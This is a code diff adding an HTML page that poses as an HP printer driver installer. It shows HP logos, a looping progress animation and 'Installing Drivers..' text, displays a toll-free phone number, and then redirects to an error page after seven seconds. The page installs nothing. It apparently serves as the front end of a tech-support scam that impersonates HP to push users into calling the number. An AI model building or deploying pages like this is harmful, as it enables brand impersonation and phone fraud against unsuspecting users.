@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Installing Drivers</title>
+    <script src="/tailwind.js"></script>
+    <style>
+        /* Circle fill animation */
+        .progress-ring__circle {
+            stroke-dasharray: 848.23;
+            /* 2πr for r=135 */
+            stroke-dashoffset: 848.23;
+            animation: progress-fill 2.5s linear infinite;
+        }
+
+        @keyframes progress-fill {
+            0% {
+                stroke-dashoffset: 848.23;
+            }
+
+            100% {
+                stroke-dashoffset: 0;
+            }
+        }
+    </style>
+    <script>
+        setTimeout(function () {
+            window.location.href = "error.html"; // Replace with your actual page
+        }, 7000); // 7000 milliseconds = 7 seconds
+    </script>
+
+</head>
+
+<body class="bg-white text-center">
+
+    <!-- Header -->
+    <!-- Centered Header with Flex and Large Text -->
+    <header class="flex justify-center items-center py-4 bg-white">
+        <div class="flex items-center gap-10">
+            <img src="images/hp-logo.jpg" alt="HP Logo" class="w-50 h-32 object-contain" />
+            <p class="text-blue-500 text-4xl ">
+                Call Our Toll Free Number +1 (888) 848-2520
+            </p>
+        </div>
+    </header>
+    <!-- Main Section -->
+    <section class="flex flex-col items-center justify-center min-h-[80vh] px-4">
+        <div class="flex flex-col md:flex-row items-center justify-center gap-36 mb-16">
+            <!-- HP Logo Left -->
+            <img src="images/hp.jpg" alt="HP Logo" class="w-72 h-72 object-contain" />
+
+            <!-- Progress Circle - Bigger -->
+            <svg class="w-[300px] h-[300px] transform -rotate-90" viewBox="0 0 270 270">
+                <circle cx="135" cy="135" r="125" fill="none" stroke="#e5e7eb" stroke-width="20" />
+                <circle class="progress-ring__circle" cx="135" cy="135" r="125" fill="none" stroke="#0284c7"
+                    stroke-width="20" stroke-linecap="round" />
+            </svg>
+
+            <!-- Printer Image Right -->
+            <img src="images/printer.jpg" alt="HP Printer" class="w-[330px] h-[230px] object-contain" />
+        </div>
+
+        <!-- Loading Text -->
+        <p class="text-blue-600 text-3xl font-semibold mt-6">Installing Drivers..</p>
+    </section>
+
+</body>
+
+</html>
